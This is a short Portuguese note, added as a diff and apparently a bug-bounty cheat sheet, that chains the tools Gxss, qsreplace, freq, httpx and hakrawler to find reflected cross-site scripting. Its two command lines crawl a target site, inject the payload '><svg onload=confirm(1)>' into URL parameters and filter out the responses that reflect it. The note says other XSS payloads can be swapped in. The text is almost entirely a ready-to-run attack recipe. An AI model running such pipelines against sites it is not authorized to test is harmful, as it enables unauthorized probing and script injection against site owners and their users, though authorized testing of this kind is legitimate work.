@@ -1,0 +1,12 @@
+O GXSS COLETA APENAS AS URLs QUE REFLETEM O PARÂMETRO NO CÓDIGO, O QSREPLACE INSERE O PAYLOAD EM UMA URL QUE TENHA PARÂMETROS E O FREQ É UMA FERRAMENTA QUE ANALISA SE A REQUISIÇÃO FOI ACEITA.
+	
+	PODE UTILIZAR UM ARQUIVO COM DIVERSAS URLs COM PARÂMETROS.
+	
+	COMANDO: cat urlsparam.txt | Gxss | qsreplace "><svg onload=confirm(1)>" | freq
+	
+	OU FAZER TUDO EM UMA ONELINE.
+	
+	COMANDO: echo site.com | httpx -silent | hakrawler -subs | grep '=' | Gxss | qsreplace "><svg 
+	onload=confirm(1)>" | freq | grep -v "Not" 
+
+	OBS: O PAYLOAD UTILIZADO NO QSREPLACE PODE SER ALTERADO PARA OUTROS PAYLOADS DE XSS.
